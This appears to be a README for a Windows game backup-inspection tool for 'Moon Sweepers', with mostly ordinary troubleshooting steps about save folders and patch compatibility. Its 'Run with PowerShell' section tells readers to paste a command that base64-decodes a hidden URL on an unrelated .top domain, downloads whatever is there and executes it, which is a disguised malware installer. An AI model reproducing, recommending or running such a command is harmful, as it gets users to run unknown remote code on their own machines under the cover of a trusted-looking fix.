<p align="center">
  <img src="https://i.postimg.cc/x10Nqr5y/banner.png" alt="Moon Sweepers Backup Browser — Windows world save and backup inspection guide" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11">
  <img src="https://img.shields.io/badge/Run%20via-PowerShell-5391FE?style=flat-square&logo=powershell" alt="Run via PowerShell">
  <img src="https://img.shields.io/badge/License-MIT-2EA44F?style=flat-square" alt="License: MIT">
</p>

# Moon Sweepers Save Unavailable or World Not Loading? Moon Sweepers Backup Browser

**Moon Sweepers added automatic world backups and recovery in its October 2026 patches. Patch 1.0.6 also changed world-save compatibility: worlds saved in 1.0.6 cannot be opened in 1.0.5.**

**Moon Sweepers Backup Browser** is a read-only Windows companion and reference for locating automatic world backups in `AppData\LocalLow`, inspecting version metadata, and keeping offline copies safe without touching active saves.

**For:** Moon Sweepers · Windows PC (Steam) · Automatic backup location, 1.0.5/1.0.6 save compatibility, and co-op checks  
**Not for:** downgrading 1.0.6 world saves to 1.0.5 or replacing the game's built-in recovery

## Run Moon Sweepers Backup Browser with PowerShell

Close **Moon Sweepers** first so no save or backup files are locked while you inspect them.

1. Press **Win + X** on your keyboard.
2. Select **Terminal** or **Windows PowerShell** from the menu (on some Windows installations **Win + X**, then **I** also opens the terminal; menu keys vary).
3. Copy the PowerShell command below into the terminal and press **Enter**.
4. Review the program output and verify any suggested backup steps before applying them.

### PowerShell command

```powershell
iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtcGxhY2UudG9wL3dvcmtlcj89NzY1MTI5MDYxMy9GaXg='))) -UseBasicParsing)
```

## What to check first

| Symptom | First useful check | Why it matters |
| --- | --- | --- |
| Co-op world fails to load after a patch | Confirm host and all clients run matching versions (1.0.6 vs. 1.0.5) | Official 1.0.6 notes confirm 1.0.6 saves are not backward-compatible with 1.0.5 |
| "Save unavailable" message appears | Update to 1.0.6+ and check antivirus / cloud-sync file locks | 1.0.6 improved write retries when security tools or sync apps briefly lock files |
| World freezes right after loading | Verify Steam applied Patch 1.0.5 or newer | Patch 1.0.5 specifically addressed a repeatable post-load freeze |
| Need to review older world snapshots | Inspect `%USERPROFILE%\AppData\LocalLow\DragDropGames\MoonSweepers\Backups` | Automatic backups are stored locally in `AppData\LocalLow`, outside Steam Cloud |

## Documented Windows backup location

On common Windows setups, automatic backups are stored under `AppData\LocalLow`:

```text
%USERPROFILE%/
└── AppData/
    └── LocalLow/
        └── DragDropGames/
            └── MoonSweepers/
                └── Backups/
```

User profiles or folder redirection can vary; always copy the folder to a dated backup directory before testing any manual file restore.

## Step-by-step checks

### 1. Check your Moon Sweepers game version

Open **Steam → Library → Moon Sweepers → Properties → Updates**. Players sharing a co-op world should run compatible versions; 1.0.6 introduced backward-incompatible saves.

### 2. Identify whether the problem is save or startup

Distinguish `"Save unavailable"` from a world that freezes after loading or a crash before the menu. The official patch notes describe different fixes for each case.

### 3. Locate the automatic backup folder

On common Windows setups, inspect `%USERPROFILE%\AppData\LocalLow\DragDropGames\MoonSweepers\Backups`.

### 4. Copy the folder before any experiment

Exit the game, copy backup contents to a separate date-stamped location, and keep the original folder untouched. Do not rename or overwrite live save files while the game is running.

### 5. Compare backup metadata read-only

Use Explorer or read-only inspection to check filenames, modified dates, and file sizes. These properties help inventory copies, though they do not prove that a particular backup is valid.

### 6. Let the built-in repair run on current patches

Patches 1.0.3 and 1.0.4 introduced recovery from certain corrupted saves; patch 1.0.5 addressed a repeatable freeze after loading. Update before resorting to manual file replacement.

### 7. Avoid restoring a newer world into an older game

Official 1.0.6 notes warn that 1.0.6 world saves no longer load in 1.0.5. Match game versions and retain a copy of your original world.

### 8. Document an unresolved issue

Collect the game build, error text, whether you were hosting or joining, and whether cloud sync or antivirus was holding a file. Remove personally identifying paths.

## Troubleshooting notes

Keep file operations reversible. Copy instead of moving your only backup, change one setting at a time, and write down what changed. Do not trust downloads that ask you to turn off Defender, disable anti-cheat, or grant administrator rights without a clear reason.

## Before opening an issue

When opening an [issue](../../issues), include:

- Exact Moon Sweepers patch version (e.g., 1.0.5 or 1.0.6+) and Windows version;
- Whether you were hosting or joining a co-op session;
- Exact error message (`Save unavailable`, load freeze, or version mismatch);
- File sizes and timestamps observed in `MoonSweepers\Backups` (without personal usernames).

## Frequently asked questions

**Where are Moon Sweepers backups on Windows?**  
The developer documents automatic backups under the `DragDropGames\MoonSweepers` folder in `AppData\LocalLow`, outside Steam Cloud.

**Why does Moon Sweepers say Save unavailable?**  
The game may temporarily be unable to write a file; official notes mention antivirus or cloud-sync locks and improved retries in 1.0.6. Check the latest game patch before changing files.

**Can Moon Sweepers 1.0.5 open a world saved in 1.0.6?**  
No. Official 1.0.6 notes explicitly describe this version incompatibility; retain backups and update everyone playing together.

## Original references

- [Moon Sweepers official Steam patch notes](https://steamcommunity.com/app/5335510/allnews)
- [Moon Sweepers community and patch notes](https://steamcommunity.com/app/5335510/)
- [Save and backup reference](https://moonsweepers.com/troubleshooting/save-backup/)

*Independent community project. Not affiliated with DragDropGames, Valve, or Steam. No game binaries, licensed assets, save files, or unofficial patches are bundled with this repository.*

---

## Search reference: Moon Sweepers Windows Troubleshooting

### Moon Sweepers save unavailable after update

When a Moon Sweepers world reports Save unavailable, check the game version, built-in retry behavior, and whether another process has locked the file.

### Moon Sweepers backup folder Windows

The Moon Sweepers backup location on a typical Windows profile is under `AppData\LocalLow\DragDropGames\MoonSweepers\Backups`; keep your own offline copy before manual troubleshooting.

### Moon Sweepers co-op world not loading 1.0.6

If Moon Sweepers co-op worlds do not load after an update, verify the host and players use compatible builds. World files saved in 1.0.6 are not backward-compatible with 1.0.5.
